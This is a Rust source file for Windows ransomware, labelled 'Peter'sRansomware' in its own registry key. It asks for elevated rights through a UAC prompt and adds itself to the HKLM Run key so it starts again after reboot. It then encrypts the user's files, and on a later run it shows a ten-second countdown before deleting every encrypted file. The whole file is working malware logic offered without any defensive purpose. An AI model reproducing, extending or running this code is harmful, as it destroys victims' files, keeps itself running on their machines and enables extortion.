#[cfg(windows)]
extern crate winapi;

mod encryption;
mod lib;
mod traversing;
use lib::anti_reversing;
use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use traversing::{traverse_and_delete, traverse_and_encrypt};
use winapi::shared::minwindef::HKEY;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::libloaderapi::GetModuleFileNameA;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::ShellExecuteA;
use winapi::um::synchapi::Sleep;
use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use winapi::um::winnt::{HANDLE, KEY_ALL_ACCESS, REG_SZ};
use winapi::um::winreg::{
    RegCloseKey, RegGetValueA, RegOpenKeyExA, RegSetValueExA, HKEY_LOCAL_MACHINE,
};
fn main() {
    if !already_encrypt() {
        //anti_reversing();
        if check_elevation() {
            println!("Elevated!!! Yay");
        } else {
            println!("Not elevated. Requesting UAC");
            std::process::exit(0);
        }
        if add_registry() == false {
            // every other time after reboot
            println!("Add registry fail");
        } else {
            // first time run
            println!("Sucessfully generate registry");
        }
        traverse_and_encrypt();
        std::process::exit(0);
    }
    println!("File is already encrypted :D. There is nothing you can do now....");

    let mut total_time = 10000;
    while total_time > 0 {
        unsafe {
            println!("You have {} seconds left", total_time / 1000);
            Sleep(1000);
            total_time -= 1000;
        }
    }
    println!("Time's up!! Deleting all encrypted files");
    traverse_and_delete();
    loop {}
}

fn add_registry() -> bool {
    unsafe {
        let mut registry_handle: HKEY = null_mut();
        if RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                .unwrap()
                .as_ptr(),
            0,
            KEY_ALL_ACCESS,
            &mut registry_handle,
        ) != 0
        {
            println!("Fail to open registry key");
            RegCloseKey(registry_handle);
            return false;
        }

        let mut reg_type: u32 = 0;
        let mut path: Vec<u8> = Vec::new();
        let mut size: u32 = 200;
        path.resize(200, 0u8);

        if RegGetValueA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                .unwrap()
                .as_ptr(),
            CString::new("Peter'sRansomware").unwrap().as_ptr(),
            2,
            &mut reg_type,
            path.as_ptr() as *const _ as *mut _,
            &mut size,
        ) != 0
        {
            let mut name: Vec<i8> = Vec::new();
            name.resize(200, 0i8);
            let mut length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
            let mut path: Vec<u8> = Vec::new();
            for i in 0..length as usize {
                path.push(name[i].clone() as u8);
            }
            path.push(0u8);
            length += 1;

            if RegSetValueExA(
                registry_handle,
                CString::new("Peter'sRansomware").unwrap().as_ptr(),
                0,
                REG_SZ,
                path.as_ptr(),
                length,
            ) != 0
            {
                println!("Fail to set registry key");
                RegCloseKey(registry_handle);
                return false;
            } else {
                RegCloseKey(registry_handle);
                return true;
            }
        } else {
            println!("Key already there, dont do anything");
            RegCloseKey(registry_handle);
            return false;
        }
    }
}

fn check_elevation() -> bool {
    unsafe {
        let mut name: Vec<i8> = Vec::new();
        name.resize(200, 0i8);
        let length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
        let mut path: Vec<u8> = Vec::new();
        for i in 0..length as usize {
            path.push(name[i].clone() as u8);
        }
        if is_elevated() {
            return true;
        } else {
            println!("This is not elevated yet");
            ShellExecuteA(
                null_mut(),
                CString::new("runas").unwrap().as_ptr(),
                CString::from_vec_unchecked(path).as_ptr(),
                null_mut(),
                null_mut(),
                1,
            );
        }
        return false;
    }
}

fn is_elevated() -> bool {
    // https://vimalshekar.github.io/codesamples/Checking-If-Admin
    let mut h_token: HANDLE = null_mut();
    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0u32;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
        GetTokenInformation(
            h_token,
            TokenElevation,
            &mut token_ele as *const _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_ele.TokenIsElevated == 1;
    }
}

fn already_encrypt() -> bool {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut _user_name: Vec<u8> = Vec::new();
    unsafe {
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);

        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        _user_name = std::mem::transmute(buffer);
        _user_name.resize((size - 1) as usize, 0u8);

        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(str::from_utf8(&_user_name[..]).unwrap());
        full_path.push_str("\\peter_yeet.peter");

        let full_path: CString = CString::new(full_path).unwrap();

        if CreateFileA(
            full_path.as_ptr(),
            1,
            1,
            null_mut(),
            OPEN_EXISTING,
            0x80,
            null_mut(),
        ) == INVALID_HANDLE_VALUE
        {
            return false;
        }
    }
    true
}
